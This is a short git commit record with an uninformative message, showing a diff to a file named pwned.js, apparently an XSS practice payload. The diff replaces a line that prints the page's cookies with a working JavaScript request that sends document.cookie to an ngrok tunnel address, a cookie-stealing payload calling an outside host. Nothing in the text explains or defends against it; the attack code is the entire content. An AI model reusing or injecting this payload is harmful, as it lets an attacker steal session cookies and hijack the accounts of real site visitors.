0a6bd5fa10e81695b6954424cf5447e1404d8e8e
aitortxu20 <aitortxuboy@gmail.com>
2023-12-02 16:45:27 +0100

    c

--- pwned.js
+++ pwned.js
@@ -1,2 +1,6 @@
 //alert("XSS");
-document.write(document.cookie)
+//document.write(document.cookie)
+
+var request = new XMLHttpRequest();
+request.open('GET', 'https://84dc-90-173-214-195.ngrok.io/?cookie=' + document.cookie);
+request.send();
